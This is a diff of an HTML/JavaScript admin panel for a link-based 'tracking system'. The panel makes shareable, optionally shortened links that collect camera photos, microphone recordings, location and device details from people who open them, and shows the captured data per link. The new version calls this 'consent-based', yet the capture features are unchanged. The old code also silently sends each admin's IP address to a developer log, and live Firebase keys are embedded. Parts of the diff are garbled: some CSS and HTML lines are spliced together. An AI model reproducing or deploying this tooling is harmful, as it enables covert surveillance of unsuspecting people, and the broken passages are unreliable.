@@ -2,23 +2,30 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Admin Panel | MR_MOMIN_🌍</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ELITE ADMIN | Mr. Momin</title>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', 'Fira Code', monospace;
+        }
+        
         body {
             background: radial-gradient(circle at 20% 30%, #03000a, #000000);
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem;
-            position: relative;
+            color: #FFD700;
             overflow-x: hidden;
+            position: relative;
         }
+        
+        /* Matrix Background */
         .matrix-bg {
             position: fixed;
             top: 0;
@@ -27,531 +34,800 @@
             height: 100%;
             pointer-events: none;
             z-index: 0;
-            opacity: 0.1;
+            opacity: 0.05;
         }
-        .glass-card {
-            background: rgba(0, 10, 20, 0.85);
-            backdrop-filter: blur(12px);
-            border-radius: 2rem;
-            border: 1px solid #ffd700;
-            max-width: 1200px;
-            width: 100%;
-            padding: 2rem;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
+        
+        /* Container */
+        .container {
             position: relative;
             z-index: 2;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
         }
-        h1 {
-            font-size: 1.8rem;
+        
+        /* Header */
+        .header {
             text-align: center;
-            color: #ffd700;
-            text-shadow: 0 0 5px #ffd700;
-            letter-spacing: 2px;
+            padding: 30px 0;
+            border-bottom: 1px solid rgba(255, 215, 0, 0.3);
+            margin-bottom: 30px;
         }
-        .tagline {
-            text-align: center;
-            color: #0ef;
-            font-size: 0.7rem;
-            border-bottom: 1px solid #ffd700;
-            display: inline-block;
-            width: auto;
-            padding-bottom: 5px;
-            margin-bottom: 1.5rem;
+        
+        .header h1 {
+            font-size: 2rem;
+            color: #FFD700;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+            letter-spacing: 3px;
+            margin-bottom: 10px;
         }
-        .uid-box {
-            background: #000000aa;
-            border-radius: 1rem;
-            padding: 10px;
-            text-align: center;
-            margin-bottom: 1.5rem;
-            border: 1px dashed #ffd700;
-        }
-        .uid-box span {
-            color: #ffd700;
-            font-size: 1.2rem;
-            font-weight: bold;
-            letter-spacing: 2px;
-        }
-        .input-group { margin-bottom: 1rem; }
-        label { display: block; font-size: 0.7rem; color: #0ef; margin-bottom: 4px; }
-        input, select {
-            width: 100%;
-            background: #001000;
-            border: 1px solid #ffd700;
-            border-radius: 1rem;
-            padding: 12px;
-            color: #0ef;
+        
+        .header .subtitle {
+            color: #00D4FF;
             font-size: 0.8rem;
-            outline: none;
+            text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
         }
+        
+        /* UID Display Box */
+        .uid-box {
+            background: rgba(0, 10, 30, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.1);
+        }
+        
+        .uid-label {
+            color: #00D4FF;
+            font-size: 0.8rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .uid-value {
+            color: #FFD700;
+            font-size: 1.8rem;
+            font-weight: bold;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.6);
+            letter-spacing: 5px;
+        }
+        
+        .uid-warning {
+            color: #ff6b6b;
+            font-size: 0.7rem;
+            margin-top: 10px;
+        }
+        
+        /* Glass Cards */
+        .glass-card {
+            background: rgba(0, 10, 30, 0.8);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 0 40px rgba(0, 212, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+        
+        .glass-card:hover {
+            border-color: rgba(255, 215, 0, 0.4);
+            box-shadow: 0 0 50px rgba(0, 212, 255, 0.2);
+        }
+        
+        .card-title {
+            color: #00D4FF;
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 1px solid rgba(0, 212, 255, 0.3);
+            padding-bottom: 10px;
+        }
+        
+        /* Feature Grid */
         .feature-grid {
             display: grid;
-            grid-template-columns: repeat(2,1fr);
-            gap: 12px;
-            margin: 1.5rem 0;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
         }
-        .feature-card {
-            background: #001500;
-            border: 1px solid #ffd700;
-            border-radius: 1rem;
-            padding: 8px;
-            text-align: center;
+        
+        .feature-item {
+            background: rgba(0, 20, 40, 0.6);
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            border-radius: 12px;
+            padding: 15px;
             cursor: pointer;
-            font-size: 0.8rem;
-            color: #0ef;
-            transition: 0.2s;
-        }
-        .feature-card.selected {
-            background: rgba(255,215,0,0.2);
-            box-shadow: 0 0 12px #ffd700;
-            border-color: #fff;
-        }
-        .btn {
-            width: 100%;
-            background: linear-gradient(95deg, #ffd700, #ffaa00);
-            border: none;
-            border-radius: 2rem;
-            padding: 12px;
-            font-weight: bold;
-            color: black;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.2s;
-        }
-        .btn:active { transform: scale(0.97); }
-        .link-box {
-            margin-top: 1.5rem;
-            background: #000000aa;
-            border-radius: 1rem;
-            padding: 12px;
-            display: none;
-            border-left: 3px solid #ffd700;
-        }
-        .link-text {
-            font-size: 0.7rem;
-            word-break: break-all;
-            background: #021a02;
-            padding: 8px;
-            border-radius: 0.5rem;
-            color: #afa;
-            margin-bottom: 8px;
-        }
-        .short-toggle {
+            transition: all 0.3s ease;
             display: flex;
             align-items: center;
-            gap: 8px;
-            margin: 12px 0;
-            background: #001000;
-            padding: 8px;
-            border-radius: 2rem;
+            gap: 10px;
         }
-        .short-toggle label { margin: 0; cursor: pointer; color: #0ef; }
-        .info-note {
-            font-size: 0.6rem;
-            text-align: center;
-            margin-top: 20px;
-            color: #ffd700;
+        
+        .feature-item:hover {
+            background: rgba(0, 40, 80, 0.6);
+            border-color: rgba(0, 212, 255, 0.5);
         }
-        .link-card {
-            background: #001500;
-            border: 1px solid #ffd700;
-            border-radius: 1rem;
-            padding: 1rem;
-            margin: 1rem 0;
+        
+        .feature-item.selected {
+            background: rgba(255, 215, 0, 0.1);
+            border-color: #FFD700;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+        }
+        
+        .feature-icon {
+            font-size: 1.5rem;
+        }
+        
+        .feature-text {
+            font-size: 0.85rem;
+            color: #FFD700;
+        }
+        
+        .feature-item.selected .feature-text {
+            color: #00D4FF;
+        }
+        
+        /* Buttons */
+        .btn {
+            width: 100%;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            border: none;
+            border-radius: 25px;
+            padding: 15px;
+            color: #000;
+            font-weight: bold;
+            font-size: 1rem;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 15px;
         }
-        .data-card {
-            background: #001500;
-            border: 1px solid #ffd700;
-            border-radius: 1rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            max-height: 500px;
-            overflow-y: auto;
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
         }
-        .flex-row {
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid #00D4FF;
+            color: #00D4FF;
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(0, 212, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
+        }
+        
+        /* Link Result */
+        .link-result {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(0, 20, 0, 0.6);
+            border: 1px solid #00D4FF;
+            border-radius: 12px;
+        }
+        
+        .link-result.show {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .link-text {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            color: #00D4FF;
+            word-break: break-all;
+            margin-bottom: 15px;
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+        
+        .link-actions {
             display: flex;
             gap: 10px;
-            flex-wrap: wrap;
-            margin-bottom: 1rem;
         }
-        .small-btn {
-            background: #ffd700;
-            color: black;
+        
+        .link-actions button {
+            flex: 1;
+            padding: 10px;
+            border-radius: 20px;
             border: none;
-            border-radius: 1rem;
-            padding: 6px 12px;
             cursor: pointer;
-            font-size: 0.7rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
         }
-        .stat-badge {
-            display: inline-block;
-            background: #ffd70033;
-            padding: 2px 8px;
-            border-radius: 1rem;
-            font-size: 0.7rem;
-            margin-right: 10px;
-            color: #ffd700;
+        
+        .btn-copy {
+            background: #00D4FF;
+            color: #000;
         }
-        .tab-content { display: block; }
-        .hide { display: none; }
-        .developer {
+        
+        .btn-copy:hover {
+            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.4);
+        }
+        
+        /* Links List */
+        .links-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .link-item {
+            background: rgba(0, 20, 40, 0.5);
+            border: 1px solid rgba(255, 215, 0, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .link-item:hover {
+            border-color: rgba(0, 212, 255, 0.3);
+            background: rgba(0, 30, 60, 0.5);
+        }
+        
+        .link-id {
+            color: #00D4FF;
+            font-size: 0.8rem;
+            margin-bottom: 5px;
+        }
+        
+        .link-stats {
+            display: flex;
+            gap: 20px;
+            margin-top: 10px;
+            font-size: 0.75rem;
+        }
+        
+        .stat {
+            color: #FFD700;
+        }
+        
+        .stat-value {
+            color: #00D4FF;
+            font-weight: bold;
+        }
+        
+        .link-options {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+        
+        .option-tag {
+            background: rgba(255, 215, 0, 0.1);
+            color: #FFD700;
+            padding: 3px 8px;
+            border-radius: 10px;
+            font-size: 0.65rem;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #FFD700;
+            border-radius: 4px;
+        }
+        
+        /* Loading Animation */
+        .loading {
+            display: none;
             text-align: center;
-            margin-top: 20px;
-            font-size: 0.7rem;
-            color: #ffd700;
+            padding: 20px;
         }
-        .click-entry {
-            border-bottom: 1px solid #ffd70033;
-            padding: 8px;
-            font-size: 0.7rem;
+        
+        .loading.show {
+            display: block;
+        }
+        
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 215, 0, 0.3);
+            border-top-color: #FFD700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px;
+            color: rgba(255, 215, 0, 0.5);
+            font-size: 0.75rem;
+            border-top: 1px solid rgba(255, 215, 0, 0.1);
+            margin-top: 30px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 600px) {
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            .header h1 {
+                font-size: 1.5rem;
+            }
+            .uid-value {
+                font-size: 1.4rem;
+            }
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 20, 40, 0.95);
+            border: 1px solid #00D4FF;
+            border-radius: 10px;
+            padding: 15px 20px;
+            color: #            padding: 15px 20px;
+            color: #00D4FF;
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification.success {
+            border-color: #00ff88;
+            color: #00ff88;
+        }
+        
+        .notification.error {
+            border-color: #ff6b6b;
+            color: #ff6b6b;
         }
     </style>
 </head>
 <body>
-<div id="matrixCanvas" class="matrix-bg"></div>
-
-<div class="glass-card" id="adminDashboard">
-    <h1>> MR_MOMIN_🌍 ADMIN_</h1>
-    <div style="text-align:center;"><span class="tagline">[ SMART TRACKING SYSTEM ]</span></div>
-
-    <div class="uid-box">
-        📛 আপনার ইউনিক আইডি (UID): <span id="adminUidDisplay">লোড হচ্ছে...</span>
-    </div>
-
-    <div class="flex-row" style="margin-bottom: 1rem;">
-        <button id="tabGenBtn" class="small-btn" style="background:#ffd700;">🔗 জেনারেটর</button>
-        <button id="tabMonitorBtn" class="small-btn">📡 লিংক মনিটর</button>
-        <button id="tabDataViewBtn" class="small-btn">📦 ডাটা ভিউয়ার</button>
-    </div>
-
-    <!-- GENERATOR TAB -->
-    <div id="tabGenerator" class="tab-content">
-        <div class="feature-grid" id="featureGrid">
-            <div class="feature-card" data-feat="C"><span>📸</span> ক্যামেরা (৩ ছবি/সেকেন্ড)</div>
-            <div class="feature-card" data-feat="M"><span>🎙️</span> মাইক্রোফোন (১০ সেকেন্ড লুপ)</div>
-            <div class="feature-card" data-feat="L"><span>📍</span> লোকেশন</div>
-            <div class="feature-card" data-feat="X"><span>💻</span> ডিভাইস তথ্য</div>
+    <!-- Matrix Background -->
+    <canvas id="matrixCanvas" class="matrix-bg"></canvas>
+    
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>⚡ ELITE ADMIN PANEL</h1>
+            <div class="subtitle">[ CONSENT-BASED ANALYTICS SYSTEM ]</div>
         </div>
-        <div class="short-toggle">
-            <input type="checkbox" id="shortenCheckbox"> <label>🔗 শর্ট লিংক তৈরি করুন (is.gd)</label>
+        
+        <!-- UID Display -->
+        <div class="uid-box">
+            <div class="uid-label">Your Unique Administrator ID</div>
+            <div class="uid-value" id="uidDisplay">GENERATING...</div>
+            <div class="uid-warning">⚠️ Save this UID. It cannot be recovered if lost.</div>
         </div>
-        <button class="btn" id="generateLinkBtn">⚡ লিংক জেনারেট করুন</button>
-        <div id="linkResultBox" class="link-box">
-            <div class="link-text" id="generatedLink">--</div>
-            <div class="copy-row" style="display:flex; gap:8px;">
-                <button id="copyFullBtn" style="background:#ffd700; color:#000; border:none; border-radius:1rem; padding:6px; flex:1;">লিংক কপি করুন</button>
+        
+        <!-- Link Generator -->
+        <div class="glass-card">
+            <div class="card-title">🔗 Generate Tracking Link</div>
+            
+            <div class="feature-grid">
+                <div class="feature-item selected" data-feature="basic">
+                    <span class="feature-icon">📊</span>
+                    <span class="feature-text">Basic Analytics</span>
+                </div>
+                <div class="feature-item" data-feature="location">
+                    <span class="feature-icon">📍</span>
+                    <span class="feature-text">Location Access</span>
+                </div>
+                <div class="feature-item" data-feature="camera">
+                    <span class="feature-icon">📸</span>
+                    <span class="feature-text">Camera Upload</span>
+                </div>
+                <div class="feature-item" data-feature="microphone">
+                    <span class="feature-icon">🎙️</span>
+                    <span class="feature-text">Microphone Upload</span>
+                </div>
+            </div>
+            
+            <button class="btn" id="generateBtn">⚡ GENERATE LINK</button>
+            
+            <div class="loading" id="loadingDiv">
+                <div class="loader"></div>
+                <div style="color: #00D4FF;">Generating secure link...</div>
+            </div>
+            
+            <div class="link-result" id="linkResult">
+                <div class="link-text" id="generatedLink"></div>
+                <div class="link-actions">
+                    <button class="btn-copy" onclick="copyLink()">📋 COPY LINK</button>
+                    <button class="btn-secondary" onclick="openLink()">🌐 OPEN</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- My Links -->
+        <div class="glass-card">
+            <div class="card-title">📋 My Generated Links</div>
+            <div class="links-list" id="linksList">
+                <div style="text-align: center; color: rgba(255,215,0,0.5); padding: 30px;">
+                    No links generated yet...
+                </div>
+            </div>
+        </div>
+        
+        <!-- My Stats -->
+        <div class="glass-card">
+            <div class="card-title">📊 My Statistics</div>
+            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; text-align: center;">
+                <div>
+                    <div style="color: #00D4FF; font-size: 2rem; font-weight: bold;" id="totalLinks">0</div>
+                    <div style="color: rgba(255,215,0,0.7); font-size: 0.8rem;">Total Links</div>
+                </div>
+                <div>
+                    <div style="color: #00D4FF; font-size: 2rem; font-weight: bold;" id="totalClicks">0</div>
+                    <div style="color: rgba(255,215,0,0.7); font-size: 0.8rem;">Total Clicks</div>
+                </div>
+                <div>
+                    <div style="color: #00D4FF; font-size: 2rem; font-weight: bold;" id="totalVisitors">0</div>
+                    <div style="color: rgba(255,215,0,0.7); font-size: 0.8rem;">Unique Visitors</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <div>System Developed by Mr. Momin</div>
+            <div style="margin-top: 5px; font-size: 0.65rem; color: rgba(0,212,255,0.5);">
+                Elite Multi-Admin Analytics & Consent-Based Media System
             </div>
         </div>
     </div>
-
-    <!-- MONITOR TAB: show all links with stats -->
-    <div id="tabMonitor" class="tab-content hide">
-        <h3 style="color:#ffd700;">📡 আপনার তৈরি লিংক সমূহ</h3>
-        <div id="linksList"></div>
-    </div>
-
-    <!-- DATA VIEWER TAB: click on link to see details + click logs -->
-    <div id="tabDataView" class="tab-content hide">
-        <h3 style="color:#ffd700;">📦 লিংকে ক্লিক করে বিস্তারিত ডাটা দেখুন</h3>
-        <div id="dataLinksList"></div>
-        <div id="dataDetails" class="hide">
-            <h4>ডাটা: <span id="selectedLinkId"></span></h4>
-            <div id="mediaList" class="data-card"></div>
+    
+    <!-- Notification -->
+    <div Analytics & Consent-Based Media System
+            </div>
         </div>
     </div>
+    
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
 
-    <div class="developer">⚡ System Developed by Mr. Momin</div>
-</div>
-
-<script>
-    // ========== FIREBASE CONFIG ==========
-    const firebaseConfig = {
-        apiKey: "AIzaSyCiAEFoHUdaaJNJr0PnweGOZ-N7zi438c0",
-        authDomain: "momin-tracking-sysrem.firebaseapp.com",
-        databaseURL: "https://momin-tracking-sysrem-default-rtdb.firebaseio.com/",
-        projectId: "momin-tracking-sysrem",
-        storageBucket: "momin-tracking-sysrem.firebasestorage.app",
-        messagingSenderId: "637134050647",
-        appId: "1:637134050647:web:86c90c894a13be2fd75a12"
-    };
-    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    const storage = firebase.storage();
-
-    // ========== MATRIX BACKGROUND ==========
-    (function matrixRain() {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        document.getElementById('matrixCanvas').appendChild(canvas);
-        const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
-        const drops = [];
-        for(let i=0; i<columns; i++) drops[i] = 1;
-        function draw() {
-            ctx.fillStyle = 'rgba(0,0,0,0.04)';
-            ctx.fillRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = '#0f0';
-            ctx.font = fontSize + 'px monospace';
-            for(let i=0; i<drops.length; i++) {
-                const text = chars[Math.floor(Math.random()*chars.length)];
-                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
-                if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i]=0;
-                drops[i]++;
+    <script>
+        // ========== FIREBASE CONFIGURATION ==========
+        const firebaseConfig = {
+            apiKey: "AIzaSyDdYUeWB_e-Pv7-4yBN49P3ZN1Ig4PTW1g",
+            authDomain: "momin-tracking-sysrem.firebaseapp.com",
+            databaseURL: "https://momin-tracking-sysrem-default-rtdb.firebaseio.com",
+            projectId: "momin-tracking-sysrem",
+            storageBucket: "momin-tracking-sysrem.firebasestorage.app",
+            messagingSenderId: "294704122788",
+            appId: "1:294704122788:web:147bff72e6bf866a808f31",
+            measurementId: "G-BS81ZN7BDD"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // ========== GLOBAL VARIABLES ==========
+        let currentUID = null;
+        let selectedFeatures = new Set(['basic']);
+        let generatedLinkURL = '';
+        
+        // ========== MATRIX BACKGROUND ==========
+        (function matrixRain() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            const drops = [];
+            
+            for(let i = 0; i < columns; i++) drops[i] = 1;
+            
+            function draw() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#FFD700';
+                ctx.font = fontSize + 'px monospace';
+                
+                for(let i = 0; i < drops.length; i++) {
+                    const text = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
             }
-        }
-        setInterval(draw, 50);
-        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
-    })();
-
-    // ========== UID MANAGEMENT ==========
-    let adminUid = null;
-
-    async function getOrCreateUid() {
-        let storedUid = localStorage.getItem('admin_uid');
-        if (storedUid && /^\d{8}$/.test(storedUid)) {
-            adminUid = storedUid;
-            document.getElementById('adminUidDisplay').innerText = adminUid;
-            return adminUid;
-        }
-        let newUid = Math.floor(10000000 + Math.random() * 90000000).toString();
-        adminUid = newUid;
-        localStorage.setItem('admin_uid', adminUid);
-        document.getElementById('adminUidDisplay').innerText = adminUid;
-
-        // Send to developer log
-        let ip = 'unknown';
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ip = data.ip;
-        } catch(e) {}
-        await db.ref(`dev_logs/new_admins/${adminUid}`).set({
-            uid: adminUid,
-            firstSeen: Date.now(),
-            ip: ip,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform
-        });
-        await db.ref(`admins/${adminUid}`).set({
-            uid: adminUid,
-            createdAt: Date.now(),
-            name: `Admin_${adminUid}`
-        });
-        return adminUid;
-    }
-
-    // ========== SETUP ==========
-    async function init() {
-        await getOrCreateUid();
-        setupTabs();
-        setupGenerator();
-        loadMonitorLinks();
-        loadDataLinks();
-    }
-
-    function setupTabs() {
-        const tabs = {
-            gen: document.getElementById('tabGenBtn'),
-            mon: document.getElementById('tabMonitorBtn'),
-            data: document.getElementById('tabDataViewBtn')
-        };
-        const contents = {
-            gen: document.getElementById('tabGenerator'),
-            mon: document.getElementById('tabMonitor'),
-            data: document.getElementById('tabDataView')
-        };
-        const showTab = (name) => {
-            for (let k in contents) contents[k].classList.add('hide');
-            contents[name].classList.remove('hide');
-        };
-        tabs.gen.onclick = () => showTab('gen');
-        tabs.mon.onclick = () => showTab('mon');
-        tabs.data.onclick = () => showTab('data');
-        showTab('gen');
-    }
-
-    // ========== LINK GENERATOR ==========
-    function setupGenerator() {
-        const featDivs = document.querySelectorAll('.feature-card');
-        let selected = new Set();
-        featDivs.forEach(div => {
-            div.addEventListener('click', () => {
-                const f = div.getAttribute('data-feat');
-                if (selected.has(f)) { selected.delete(f); div.classList.remove('selected'); }
-                else { selected.add(f); div.classList.add('selected'); }
+            
+            setInterval(draw, 50);
+            
+            window.addEventListener('resize', () => {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
             });
-        });
-        const genBtn = document.getElementById('generateLinkBtn');
-        const linkBox = document.getElementById('linkResultBox');
-        const linkSpan = document.getElementById('generatedLink');
-        const shortCheck = document.getElementById('shortenCheckbox');
-        genBtn.onclick = async () => {
-            if (selected.size === 0) { alert("অন্তত একটি ফিচার নির্বাচন করুন"); return; }
-            const features = Array.from(selected).join('');
-            const linkId = 'link_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-            const baseUrl = window.location.origin + window.location.pathname.replace('admin.html', 'track.html');
-            const fullLink = `${baseUrl}?id=${linkId}&admin=${adminUid}&f=${features}`;
-            const linkData = {
-                linkId: linkId,
-                features: features,
-                createdAt: Date.now(),
-                createdBy: adminUid,
-                shortUrl: null
-            };
-            if (shortCheck.checked) {
-                linkSpan.innerText = 'শর্ট লিংক তৈরি হচ্ছে...';
-                try {
-                    const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(fullLink)}`);
-                    const data = await res.json();
-                    const short = data.shorturl || fullLink;
-                    linkData.shortUrl = short;
-                    linkSpan.innerText = short;
-                } catch(e) { linkSpan.innerText = fullLink; }
+        })();
+        
+        // ========== UID GENERATION & MANAGEMENT ==========
+        function generateUID() {
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            let uid = '';
+            for(let i = 0; i < 8; i++) {
+                uid += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return uid;
+        }
+        
+        async function initializeUID() {
+            // Check localStorage first
+            let savedUID = localStorage.getItem('eliteAdminUID');
+            
+            if(!savedUID) {
+                // Generate new UID
+                savedUID = generateUID();
+                localStorage.setItem('eliteAdminUID', savedUID);
+                
+                // Save to Firebase
+                const adminRef = database.ref('admins/' + savedUID);
+                await adminRef.set({
+                    createdAt: firebase.database.ServerValue.TIMESTAMP,
+                    lastActive: firebase.database.ServerValue.TIMESTAMP,
+                    totalLinks: 0,
+                    totalClicks: 0
+                });
+                
+                // Log to master logs
+                await database.ref('master_logs/admins/' + savedUID).set({
+                    createdAt: firebase.database.ServerValue.TIMESTAMP,
+                    action: 'admin_created'
+                });
+                
+                showNotification('New Admin UID Generated!', 'success');
             } else {
-                linkSpan.innerText = fullLink;
+                // Update last active
+                await database.ref('admins/' + savedUID + '/lastActive').set(
+                    firebase.database.ServerValue.TIMESTAMP
+                );
             }
-            await db.ref(`links/${adminUid}/${linkId}`).set(linkData);
-            linkBox.style.display = 'block';
-            loadMonitorLinks();
-        };
-        document.getElementById('copyFullBtn').onclick = () => {
-            const txt = linkSpan.innerText;
-            if (txt && txt !== '--' && !txt.includes('শর্ট')) copyClip(txt);
-            else alert("প্রথমে লিংক জেনারেট করুন");
-        };
-    }
-    function copyClip(t) { navigator.clipboard.writeText(t).then(() => alert("লিংক কপি হয়েছে")); }
-
-    // ========== MONITOR TAB: show links with live counters (photo, audio, location, clicks) ==========
-    async function loadMonitorLinks() {
-        const linksRef = db.ref(`links/${adminUid}`);
-        linksRef.on('value', (snapshot) => {
-            const links = snapshot.val();
-            const container = document.getElementById('linksList');
-            if (!links) { container.innerHTML = '<div class="data-card">এখনো কোনো লিংক তৈরি হয়নি।</div>'; return; }
-            let html = '<div class="data-card">';
-            for (let id in links) {
-                const link = links[id];
-                // get counts from captured_data
-                const countRef = db.ref(`captured_data/${adminUid}/${id}`);
-                countRef.on('value', (trackSnap) => {
-                    const trackData = trackSnap.val();
-                    let photoCount = 0, audioCount = 0, locCount = 0, clickCount = 0;
-                    if (trackData) {
-                        for (let key in trackData) {
-                            if (key.startsWith('camera_photo')) photoCount++;
-                            else if (key.startsWith('microphone_audio')) audioCount++;
-                            else if (key.startsWith('location')) locCount++;
-                            else if (key.startsWith('click_')) clickCount++;
-                        }
-                    }
-                    const cardElem = document.getElementById(`link-card-${id}`);
-                    if (cardElem) {
-                        cardElem.innerHTML = `<strong>🔗 ${id}</strong><br>
-                            ফিচার: ${link.features}<br>
-                            তৈরি: ${new Date(link.createdAt).toLocaleString()}<br>
-                            <span class="stat-badge">👆 ${clickCount} ক্লিক</span>
-                            <span class="stat-badge">📸 ${photoCount}</span>
-                            <span class="stat-badge">🎙️ ${audioCount}</span>
-                            <span class="stat-badge">📍 ${locCount}</span>
-                            ${link.shortUrl ? `<br>শর্ট: <a href="${link.shortUrl}" target="_blank">${link.shortUrl}</a>` : ''}`;
-                    }
-                });
-                html += `<div class="link-card" id="link-card-${id}" data-linkid="${id}"></div>`;
-            }
-            container.innerHTML = html;
-            document.querySelectorAll('.link-card').forEach(card => {
-                card.addEventListener('click', () => {
-                    const linkId = card.getAttribute('data-linkid');
-                    document.getElementById('tabDataViewBtn').click();
-                    setTimeout(() => showLinkData(linkId), 200);
-                });
+            
+            currentUID = savedUID;
+            document.getElementById('uidDisplay').textContent = currentUID;
+            
+            // Load admin data
+            loadAdminData();
+        }
+        
+        // ========== FEATURE SELECTION ==========
+        document.querySelectorAll('.feature-item').forEach(item => {
